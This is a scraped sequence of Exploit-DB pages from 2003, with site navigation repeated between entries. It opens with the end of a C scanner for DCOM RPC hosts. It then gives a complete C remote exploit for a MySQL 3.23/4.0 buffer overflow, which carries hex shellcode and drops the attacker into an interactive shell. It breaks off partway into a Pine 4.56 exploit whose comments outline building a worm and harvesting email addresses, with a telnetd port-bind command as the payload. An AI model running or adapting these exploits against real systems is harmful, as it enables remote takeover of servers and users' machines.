);for ( i = 0; i < sizeof( expected5_vulnerable_or_patched2 ); i++ ) {if ( resp5[ i ] != expected5_vulnerable_or_patched2[ i ] )printf( "    %04x %02x != %02x\n", i, resp5[ i ],expected5_vulnerable_or_patched2[ i ] );}}else if ( verbose > 1 ) {printf( "%s contains unidentified signature,\n",my_inet_ntoa( ip ) );printf( "Please report if vulnerable.\n" );}return 255;}voidusage( int rc ) {fprintf( stderr, "Usage: %s [-vqh] [ -t timeout ] <ip address>\n""       %s [-vqh] [ -t timeout ] <ip address>/<cidr-bits>\n""    -v    increase verbosity\n""    -q    quiet, no output, just exit status\n""    -t n  set scan timeout to n seconds, default %d\n""    -h    this help\n""    when scanning one ip, exits with:\n""        0 not vulnerable\n""        1 does not accept DCE RPC protocol (connection refused)\n""        2 no response (filtering DCOM port, or not there)\n""        3 vulnerable to dcom 1 and dcom2\n""        4 vulnerable to dcom 2 (but patched for dcom1)\n""        255 can't tell for some other reason\n""    when scanning an ip range, exits with:\n""        0 nothing was vulnerable\n""        4 one or more were vunerable\n",program_name, program_name, d_dcom_scan_timeout );exit( rc );}intmain( int argc, char **argv )  {int a, b, c, d, bits;unsigned int mask, low, high, ip, netip;int rc = 0, r;program_name = argv[0];verbose = 1;  // turn on basic prints in scan functiondcom_scan_timeout = d_dcom_scan_timeout;while ( ( c = getopt( argc, argv, "vqt:h" ) ) >= 0 ) {switch ( c ) {case 'v':verbose++;break;case 'q':verbose = 0;break;case 't':dcom_scan_timeout = atoi( optarg );break;case 'h':usage( 0 );break;default:usage( -1 );break;}}if ( optind >= argc || ! argv[ optind ] )usage( -1 );rc = sscanf( argv[ optind ], "%d.%d.%d.%d/%d", &a, &b, &c, &d, &bits );if ( rc == 5 )  {// scan rangeif ( bits < 0 || 32 < bits )usage( -1 );rc = 0;mask = 0xffffffff << ( 32 - bits );low = ( a << 24 | b << 16 | c << 8 | d ) & mask;high = low | ~ mask;for ( ip = low + 1; ip < high; ip++ ) {netip = htonl( ip );r = dcom2_scan( netip );if ( r == 3 || r == 4 )rc = 4;}}else if ( rc == 4 ) {// scan 1 ipinet_pton( AF_INET, argv[ optind ], (struct in_addr *) &netip );rc = dcom2_scan( netip );}elseusage( -1 );return rc;}// milw0rm.com [2003-09-12]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 98
MySQL 3.23.x/4.0.x - Remote Buffer Overflow - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMySQL 3.23.x/4.0.x - Remote Buffer OverflowEDB-ID:98CVE:2003-0780EDB Verified:Author:bkbllType:remoteExploit:/Platform:LinuxDate:2003-09-14Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* Mysql 3.23.x/4.0.x remote exploit* proof of concept* using jmp *eax* bkbll (bkbll cnhonker.net,bkbll tom.com) 2003/09/12* compile:gcc -o mysql mysql.c -L/usr/lib/mysql -lmysqlclient* DO NOT DISTRUBITED IT*/#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <errno.h>#include <sys/socket.h>#include <sys/types.h>#include <sys/select.h>#include <netdb.h>#include <mysql/mysql.h>#define PAD 19*4*2#define JMPADDR 0x42125b2b#define ROOTUSER "root"#define PORT 3306#define MYDB "mysql"#define ALTCOLUMSQL "ALTER TABLE user CHANGE COLUMN Password Password LONGTEXT"#define LISTUSERSQL "SELECT user FROM mysql.user WHERE user!='root' OR user='root LIMIT 1,1'"#define FLUSHSQL "\x11\x00\x00\x00\x03\x66\x6C\x75\x73\x68\x20\x70\x72\x69\x76\x69\x6C\x65\x67\x65\x73"#define BUF 1024MYSQL *conn;char NOP[]="90";/*char shellcode[]="31c031db31c9b002""cd8085c0751b4b31""d2b007cd8031c0b0""40cd8089c331c9b1""09b025cd80b001cd""80b017cd8031c050""405089e331c9b0a2""cd80b1e089c883e8""0af7d04089c731c0""404c89e250505257""518d4c240431dbb3""0ab066cd805983f8""017505803a497409""e2d231c04089c3cd""8089fbb103b03f49""cd8041e2f851686e""2f7368682f2f6269""89e351682d696c70""89e251525389e131""d231c0b00bcd8090";*/char shellcode[]="db31c03102b0c931""c08580cd314b1b74""cd07b0d2b0c03180""8980cd40b1c931c3""cd25b009cd01b080""cd17b08050c03180""e3895040a2b0c931""e0b180cde883c889""40d0f70ac031c789""e2894c4057525050""244c8d51b3db3104""cd66b00af8835980""800575010974493a""c031d2e2cdc38940""b1fb8980493fb003""e24180cd6e6851f8""6868732f69622f2f""6851e389706c692d""5251e28931e18953""b0c031d29080cd0b";int type=1;struct{char *os;u_long ret;} targets[] ={{ "glibc-2.2.93-5", 0x42125b2b },},v;void usage(char *);void sqlerror(char *);MYSQL *mysqlconn(char *server,int port,char *user,char *pass,char *dbname);main(int argc,char **argv){MYSQL_RES *result;MYSQL_ROW row;char jmpaddress[8];char buffer[BUF],muser[20],buf2[800];my_ulonglong rslines;struct sockaddr_in clisocket;int i=0,j,clifd,count,a;char data1,c;fd_set fds;char *server=NULL,*rootpass=NULL;if(argc<3) usage(argv[0]);while((c = getopt(argc, argv, "d:t:p:"))!= EOF){switch (c){case 'd':server=optarg;break;case 't':type = atoi(optarg);if((type > sizeof(targets)/sizeof(v)) || (type < 1))usage(argv[0]);break;case 'p':rootpass=optarg;break;default:usage(argv[0]);return 1;}}if(server==NULL || rootpass==NULL)usage(argv[0]);memset(muser,0,20);memset(buf2,0,800);printf("@-------------------------------------------------@\n");printf("#  Mysql 3.23.x/4.0.x remote exploit(2003/09/12)  #\n");printf("@ by bkbll(bkbll_at_cnhonker.net,bkbll_at_tom.com @\n");printf("---------------------------------------------------\n");printf("[+] Connecting to mysql server %s:%d....",server,PORT);fflush(stdout);conn=mysqlconn(server,PORT,ROOTUSER,rootpass,MYDB);if(conn==NULL) exit(0);printf("ok\n");printf("[+] ALTER user column...");fflush(stdout);if(mysql_real_query(conn,ALTCOLUMSQL,strlen(ALTCOLUMSQL))!=0)sqlerror("ALTER user table failed");//selectprintf("ok\n");printf("[+] Select a valid user...");fflush(stdout);if(mysql_real_query(conn,LISTUSERSQL,strlen(LISTUSERSQL))!=0)sqlerror("select user from table failed");printf("ok\n");result=mysql_store_result(conn);if(result==NULL)sqlerror("store result error");rslines=mysql_num_rows(result);if(rslines==0)sqlerror("store result error");row=mysql_fetch_row(result);snprintf(muser,19,"%s",row[0]);printf("[+] Found a user:%s\n",muser);memset(buffer,0,BUF);i=sprintf(buffer,"update user set password='");sprintf(jmpaddress,"%x",JMPADDR);jmpaddress[8]=0;for(j=0;j<PAD-4;j+=2){memcpy(buf2+j,NOP,2);}memcpy(buf2+j,"06eb",4);memcpy(buf2+PAD,jmpaddress,8);memcpy(buf2+PAD+8,shellcode,strlen(shellcode));j=strlen(buf2);if(j%8){j=j/8+1;count=j*8-strlen(buf2);memset(buf2+strlen(buf2),'A',count);}printf("[+] Password length:%d\n",strlen(buf2));memcpy(buffer+i,buf2,strlen(buf2));i+=strlen(buf2);i+=sprintf(buffer+i,"' where user='%s'",muser);mysql_free_result(result);printf("[+] Modified password...");fflush(stdout);//get result//write(2,buffer,i);if(mysql_real_query(conn,buffer,i)!=0)sqlerror("Modified password error");//here I'll find client socket fdprintf("ok\n");printf("[+] Finding client socket......");j=sizeof(clisocket);for(clifd=3;clifd<256;clifd++){if(getpeername(clifd,(struct sockaddr *)&clisocket,&j)==-1) continue;if(clisocket.sin_port==htons(PORT)) break;}if(clifd==256){printf("FAILED\n[-] Cannot find client socket\n");mysql_close(conn);exit(0);}data1='I';printf("ok\n");printf("[+] socketfd:%d\n",clifd);//let server overflowprintf("[+] Overflow server....");fflush(stdout);send(clifd,FLUSHSQL,sizeof(FLUSHSQL),0);//if(mysql_real_query(conn,FLUSHSQL,strlen(FLUSHSQL))!=0)//    sqlerror("Flush error");printf("ok\n");printf("[+] sending OOB.......");fflush(stdout);if(send(clifd,&data1,1,MSG_OOB)<1){perror("error");mysql_close(conn);exit(0);}printf("ok\r\n");printf("[+] Waiting a shell.....");fflush(stdout);j=0;memset(buffer,0,BUF);while(1){FD_ZERO(&fds);FD_SET(0, &fds);FD_SET(clifd, &fds);if (select(clifd+1, &fds, NULL, NULL, NULL) < 0){if (errno == EINTR) continue;break;}if (FD_ISSET(0, &fds)){count = read(0, buffer, BUF);if (count <= 0) break;if (write(clifd, buffer, count) <= 0) break;memset(buffer,0,BUF);}if (FD_ISSET(clifd, &fds)){count = read(clifd, buffer, BUF);if (count <= 0) break;if(j==0) printf("Ok\n");j=1;if (write(1, buffer, count) <= 0) break;memset(buffer,0,BUF);}}}void usage(char *s){int a;printf("@-------------------------------------------------@\n");printf("#  Mysql 3.23.x/4.0.x remote exploit(2003/09/12)  #\n");printf("@ by bkbll(bkbll_at_cnhonker.net,bkbll_at_tom.com @\n");printf("---------------------------------------------------\n");printf("Usage:%s -d <host> -p <root_pass> -t <type>\n",s);printf("      -d target host ip/name\n");printf("      -p 'root' user paasword\n");printf("      -t  type [default:%d]\n",type);printf("      ------------------------------\n");for(a = 0; a < sizeof(targets)/sizeof(v); a++)printf("         %d [0x%.8x]: %s\n", a+1, targets[a].ret, targets[a].os);printf("\n");exit(0);}MYSQL *mysqlconn(char *server,int port,char *user,char *pass,char *dbname){MYSQL *connect;connect=mysql_init(NULL);if(connect==NULL){printf("FAILED\n[-] init mysql failed:%s\n",mysql_error(connect));return NULL;}if(mysql_real_connect(connect,server,user,pass,dbname,port,NULL,0)==NULL){printf("FAILED\n[-] Error: %s\n",mysql_error(connect));return NULL;}return connect;}void sqlerror(char *s){fprintf(stderr,"FAILED\n[-] %s:%s\n",s,mysql_error(conn));mysql_close(conn);exit(0);}// milw0rm.com [2003-09-14]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 99
Pine 4.56 - Remote Buffer Overflow - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDPine 4.56 - Remote Buffer OverflowEDB-ID:99CVE:2003-0720EDB Verified:Author:sorboType:remoteExploit:/Platform:LinuxDate:2003-09-16Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** Mon Sep 15 09:35:01 CEST 2003** (remote?) Pine <= 4.56 exploit* by sorbo (sorbox yahoo com)* darkirco** Ok won't talk much about the bug since as usual idefense advisories* are *proper* advisories and explain everything... exploiting the bug* is trivial after reading the adv:* http://www.idefense.com/advisory/09.10.03.txt** There are two ways of doing this:* 1) standard shellcode* we don't need offset here because of nature of hole...* all we need is distance from a variable to eip which is quite fixed* it is not like we need an "offset somewhere in stack"* just a relative distance** 2) ret to libc (should work on fbsd too)* this requires our command string somewhere in memory* we may use .bss (fixed)* we also need distance from variable to ebp (quite fixed)* and we need addr of system (fixed)* This is "own" grsec since we don't really run a shellcode* and directly overwrite eip** In both method i said u need the dist from var -> eip/ebp* this can actually be "bruteforced"* I didn't show this since this is a PoC and uses "exact offsets"* All u do is supply multiple charsets and overwrite larger areas of memory* This makes method 1 100% successfull (or letys say 99.9%)* (nice for remote exploitation)** Method 2 is "slightly harder" to bruteforce since u must NOT overwrite* eip... so u must "stop ur bruteforce ad ebp" somehow... but thats kinda* gay ;D** With unfallable method one a worm can easily be done...* shellcode that listens and uploads worm...* and executes a grep \@ /var/spool/mail/bla or whatever to get emails* or pine addr book** also for normal "owning" u can use reverse telnetd shellcode* so u just keep a server up and don't have to "wait" for person* to launch sploit** Greetz: zen-parse (thanks for your patience (if im not in ur ignore ;D))*		non metto i soliti stronzi de merda nei greetz (tipo gunzip ;D)*		e specialmente kuelle ke non me la danno ;D ahahah**		#areyoucrazy@ircnet*			(most leet chan... fill it up with ur bots ;D)**	and last but not least... the world must know: s0lar TI AMO!!!*** ok enough... hope this exp is lame enough i wanted to close my summer* vacation with it and proove the world i had nothing better to do =D* college is starting c ya** to own remotely: ./sorpine -o 1 -t bla bla com | sendmail -t** Enjoy have fun!**/#include <stdlib.h>#include <unistd.h>#include <sys/ptrace.h>#include <errno.h>#include <linux/user.h>#include <sys/wait.h>#include <sys/types.h>#include <signal.h>#include <stdio.h>#include <sys/stat.h>#include <fcntl.h>#define PINE "/usr/bin/pine"#define PLIST 50	/* a location buff-PLIST that is writable (.bss) *//* port bind command ;D* from vi spawn a shell duh...**/char *lame_cmd ="/usr/sbin/in.telnetd -L /usr/bin/vi -debug 6682 & /bin/killall -9 pine";struct target_info {char desc[1024];int method;	/* 0 easy , 1 hard */int dist;	/* eip or ebp depending on method */int buff;int sys;};/** notice to slackware maintainers:* sorry guyz.. its not that im against u* its that I only use slack =(* thats y all my exps only have slack targets ;D* keep up the good work =D* plus... its free advertisment for u!**/struct target_info targets[] = {{ "Slackware 9.0",0,300,0,0},{ "Slackware 9.0",1,296,0x083c8f15,0x0804aeda},{ "Slackware 8.1",0,284,0,0},{ "Slackware 8.1",1,280,0x0838e0d5,0x0804aeca},{ "Slackware 8.0",0,284,0,0},{ "Slackware 8.0",1,280,0x0836d875,0x0804a5ba}};/** Non usable chars in egg (sc and various addrs)**/char nonusable[] = "\x09\x0a\x0d\x28\x29\x5c";/** lame (but working??) modification of sorshell* no setsockopt() =((( too long* portbinding shellcode with terminal support* (if whatever i said makes sense)* port 6682* telnet ip 6682* ^]* telnet> mode character** funny how my ret to libc does the same thing and its 0 byte shellcode ;D**/char shellcode[] 